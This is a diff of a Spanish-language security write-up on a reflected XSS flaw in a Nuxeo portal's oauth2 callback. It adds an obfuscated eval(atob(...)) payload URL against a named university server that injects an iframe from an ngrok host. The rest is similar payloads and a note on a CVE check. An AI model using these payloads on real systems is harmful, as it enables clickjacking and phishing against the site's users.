@@ -270,8 +270,12 @@ https://PortalNuxeo/nuxeo/site/oauth2/<img src=x onerror=eval(atob("bGV0IGRhdGEg
 https://PortalNuxeo/nuxeo/site/oauth2/%3Cimg%20src=x%20onerror=eval(atob(%22ZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAiPGlmcmFtZSBzcmM9J2h0dHBzOi8veHh4eHh4eC5jb20vJz48L2lmcmFtZT4iOw==%22))%3E/callback
 > document.body.innerHTML = "<iframe src='https://WebVulnerableAClickJacking.com/'></iframe>";
 
+https://documental.portaloas.udistrital.edu.co/nuxeo/site/oauth2/%3Cimg%20src=x%20onerror=eval(atob(%22ZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAiPGlmcmFtZSBzcmM9J2h0dHBzOi8vN2ZjMjc5YTNmZWFmLm5ncm9rLWZyZWUuYXBwL2lmcmFtZS5odG1sJyB3aWR0aD0nMTAwJScgaGVpZ2h0PSc2MDBweCc+PC9pZnJhbWU+Ijs=%22))%3E/callback
+
+
 ### Al igual al final si pude descubrir la version del Nuxeo siendo la 9.10 hotfix:
 <img width="1908" height="512" alt="image" src="https://github.com/user-attachments/assets/c6fe823f-7b3c-468c-874a-ca5a82768b1e" />
+
 
 Esta version tiene otro exploit asociado **CVE-2018-16341**, pero lo comprobe y en mi caso no era vulnerable
 https://github.com/mpgn/CVE-2018-16341
